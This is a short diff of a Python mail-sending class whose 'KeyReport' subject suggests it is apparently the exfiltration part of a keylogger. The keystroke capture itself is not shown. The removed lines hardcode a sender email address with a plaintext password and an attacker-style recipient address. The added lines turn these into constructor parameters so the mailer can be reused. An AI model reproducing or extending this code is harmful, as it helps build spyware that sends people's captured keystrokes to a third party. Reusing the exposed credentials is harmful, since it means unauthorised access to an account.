@@ -10,11 +10,11 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 class mailSender:
-    def __init__(self):
-        self.sender = "user93321245@outlook.com"
-        self.password = "YouHaveBeenHackedByMe02"
+    def __init__(self , sender , senderpassword , receiver , subject = "KeyReport" ):
+        self.sender = sender 
+        self.password = senderpassword
         
-        self.to = "yed3926@tuta.io" 
+        self.to = receiver
         
         self.subject = "KeyReport"
         
